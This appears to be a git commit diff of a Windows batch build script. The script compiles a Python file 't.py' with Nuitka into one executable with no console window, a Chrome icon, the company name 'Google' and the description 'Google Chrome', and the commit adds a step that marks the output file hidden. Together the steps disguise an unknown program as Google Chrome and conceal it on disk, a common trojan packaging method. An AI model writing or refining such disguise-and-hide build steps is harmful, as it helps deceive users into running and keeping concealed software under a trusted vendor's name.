6b67b471b0e94fd06fa124a5d561504c0d9de979
user-sspmynxdvb <132933165+user-sspmynxdvb@users.noreply.github.com>
2024-04-25 16:47:36 +0300

    compiler

--- compiler.bat
+++ compiler.bat
@@ -1,4 +1,6 @@
 pip install getmac
+pip install zstandard
 pip install nuitka
 
 nuitka --onefile --windows-disable-console --windows-icon-from-ico=chrome.ico --windows-company-name=Google --windows-file-version=1.0.0.1 --windows-file-description="Google Chrome"  t.py
+attrib +h t.exe
